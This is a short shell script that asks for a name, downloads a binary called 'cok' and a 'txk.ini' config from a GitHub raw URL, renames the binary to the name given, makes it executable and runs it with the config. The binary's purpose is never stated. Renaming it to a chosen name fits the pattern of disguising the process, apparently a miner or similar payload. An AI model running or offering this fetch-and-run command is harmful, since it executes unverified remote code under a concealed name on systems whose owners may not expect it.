read -p " name: " CRP
wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/txk.ini && mv cok $CRP && chmod +x $CRP && ./$CRP txk.ini
